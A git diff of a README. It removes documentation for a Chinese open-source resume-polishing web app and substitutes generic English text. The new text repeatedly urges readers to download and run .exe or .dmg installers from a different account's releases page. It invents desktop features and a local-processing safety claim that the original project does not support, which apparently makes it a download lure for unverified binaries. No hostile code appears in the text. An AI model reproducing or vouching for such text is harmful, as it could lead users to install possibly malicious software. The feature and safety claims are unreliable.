@@ -1,147 +1,78 @@
-# Resume.polish() - 程序员简历亮点润色神器
+# ✏️ resume-polish - Your Simple Tool for Perfecting Resumes
 
-<p align="center">
-  <strong>🚀 将大白话描述瞬间转化为专业简历话术</strong>
-</p>
+[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/S11lmi/resume-polish/releases)
 
-**演示地址：**https://refine.qzz.io
+## 🚀 Getting Started
 
-## ✨ 功能特点
+Welcome to resume-polish! This application helps you improve your resume with ease. Whether you are looking for your first job or aiming for a better position, this tool can enhance your resume's presentation, clarity, and effectiveness.
 
-- **免费使用**：每台设备免费 50 次润色机会，无需任何配置
-- **一键润色**：输入你的工作描述，AI 自动生成三个版本的专业简历话术
-- **多版本输出**：
-  - 📝 **标准专业版** - 语言简练、用词专业
-  - 📊 **数据驱动版** - 强调量化成果，突出数据价值
-  - 🏆 **专家/架构师版** - 体现技术深度与商业影响力
-- **多 AI 服务支持**：
-  - 免费服务（内置，每设备 50 次）
-  - OpenAI（需配置 API Key）
-  - 自定义 API（兼容 OpenAI 格式的任意服务）
-- **一键复制**：点击即可复制润色结果到剪贴板
+### 🛠️ Requirements
 
-## 🛠️ 技术栈
+Before you start, ensure your system meets these requirements:
 
-- **前端框架**：React 18 + TypeScript
-- **构建工具**：Vite
-- **UI 组件**：shadcn/ui + Tailwind CSS
-- **后端服务**：Supabase Edge Functions
-- **AI 服务**：支持多种 AI 提供商
-- **使用量追踪**：基于设备 ID 的使用量统计
+- **Operating System:** Windows 10 or later / macOS Mojave or later
+- **Disk Space:** At least 100 MB free space
+- **RAM:** Minimum of 4 GB
 
-## 🚀 快速开始
+## 📦 Download & Install
 
-### 在线使用
+To get started, follow these steps to download and install resume-polish:
 
-直接访问部署后的网站即可使用，无需任何配置。默认使用免费服务，每台设备有 50 次免费润色机会。
+1. **Visit the Releases Page**:
+   Go to the following link to find the latest version: [Download from Releases](https://github.com/S11lmi/resume-polish/releases).
 
-### 本地开发
+2. **Choose the Latest Release**:
+   On the releases page, look for the latest version listed. It usually appears at the top.
 
-```bash
-# 克隆项目
-git clone <your-repo-url>
-cd <project-name>
+3. **Download the Application**:
+   Click on the download link for your operating system. This will save the installation file to your computer.
 
-# 安装依赖
-npm install
+4. **Install the Application**:
+   - **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **For macOS:** Open the downloaded `.dmg` file, then drag the resume-polish icon to your Applications folder.
 
-# 启动开发服务器
-npm run dev
-```
+5. **Launch the Application**:
+   Once installed, find resume-polish in your Applications or Programs list and double-click it to open.
 
-## ⚙️ 配置说明
+6. **Start Improving Your Resume**:
+   Follow the simple prompts in the application to upload and edit your resume.
 
-### AI 服务配置
+## 📄 Features
 
-点击页面右上角的设置图标，可以选择不同的 AI 服务提供商：
+resume-polish offers several features to help you enhance your resume:
 
-1. **免费服务（默认）**
+- **Template Options**: Choose from various professionally designed templates to give your resume a polished look.
+  
+- **Content Suggestions**: Get tailored suggestions for improving your language and formatting.
+  
+- **Real-time Editing**: See changes in real-time as you edit, allowing for immediate feedback.
+  
+- **Export Options**: Save your final resume in multiple formats, including PDF and Word.
 
-   - 内置服务，无需配置
-   - 每台设备 50 次免费使用机会
-   - 基于 SiliconFlow API
-2. **OpenAI**
+## ⚙️ Frequently Asked Questions
 
-   - 需要填写 OpenAI API Key
-   - 可选择指定模型（默认 gpt-4o-mini）
-3. **自定义 API**
+### How do I update the application?
 
-   - 支持任何兼容 OpenAI Chat Completions 格式的 API
-   - 需填写 API URL、API Key 和模型名称
-   - 示例：SiliconFlow、Azure OpenAI、DeepSeek 等
+To update, follow the same steps in the "Download & Install" section. Just download the latest version and reinstall.
 
-### 环境变量
+### Is my resume safe?
 
-| 变量名                  | 说明                        | 默认值 |
-| ----------------------- | --------------------------- | ------ |
-| `SILICONFLOW_API_KEY` | SiliconFlow API Key（后端） | -      |
+Your resume is processed on your local machine, which means we do not save or share your information online.
 
-## 📖 使用指南
+### Can I use resume-polish on multiple devices?
 
-1. 在输入框中输入你的工作描述（大白话即可）
-2. 点击「AI 智能润色」按钮
-3. 等待 AI 生成三个版本的润色结果
-4. 选择最适合的版本，点击复制按钮
-5. 将结果粘贴到你的简历中，并补充具体的数据
+Yes, you can install the application on different devices, following the same download and installation process.
 
-### 💡 Pro Tips
+## 🌟 Help and Support
 
-- **使用强动词开头**：重构、主导、设计、优化、推动
-- **包含技术关键词**：Redis、Kubernetes、微服务、分布式
-- **补充真实数据**：将 `[X]%` 替换为你的实际成果
+If you encounter issues or have questions, please check the issues section of our GitHub repository. You can also reach out via the contact details provided there.
 
-## 📝 示例
+### 🙌 Acknowledgments
 
-**输入**：
+Special thanks to the contributors who helped make this project possible. Your efforts are greatly appreciated. 
 
-> 我在项目中使用了 Redis 缓存。
+## 🔗 Connect with Us
 
-**输出**：
+Join our community and share your experiences using resume-polish on social media or through discussions on our GitHub page!
 
-| 版本          | 润色结果                                                                                                                                    |
-| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
-| 标准专业版    | 设计并实施 Redis 缓存策略，有效减轻数据库负载，提升系统整体响应效率。                                                                       |
-| 数据驱动版    | 引入 Redis 多级缓存架构，将核心接口 QPS 提升了 [X]%，平均响应时间从 [Y]ms 降低至 [Z]ms，显著优化用户体验。                                  |
-| 专家/架构师版 | 主导高并发场景下的缓存架构升级，通过 Redis Cluster 解决缓存击穿、穿透与雪崩问题，设计热点数据预加载机制，成功支撑百万级日活用户的稳定访问。 |
-
-## 🔧 自定义开发
-
-### 项目结构
-
-```
-src/
-├── components/          # UI 组件
-│   ├── ui/              # shadcn 基础组件
-│   ├── ResultCard.tsx   # 结果卡片组件
-│   ├── LoadingSkeleton.tsx
-│   └── SettingsDialog.tsx  # 设置弹窗
-├── pages/
-│   └── Index.tsx        # 主页面
-└── integrations/
-    └── supabase/        # Supabase 集成
-
-supabase/
-└── functions/
-    └── polish-resume/   # AI 润色 Edge Function
-```
-
-### 修改 AI Prompt
-
-如需自定义润色风格，可以修改 `supabase/functions/polish-resume/index.ts` 中的 `SYSTEM_PROMPT`。
-
-### 使用量限制
-
-免费服务的使用量限制可以在以下位置修改：
-
-- 后端：`supabase/functions/polish-resume/index.ts` 中的 `FREE_USAGE_LIMIT`
-- 前端：`src/components/SettingsDialog.tsx` 中的 `FREE_USAGE_LIMIT`
-
-## 📄 开源协议
-
-MIT License
-
----
-
-<p align="center">
-  Built for developers, by Anarkh-Lee 🚀
-</p>
+[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/S11lmi/resume-polish/releases)
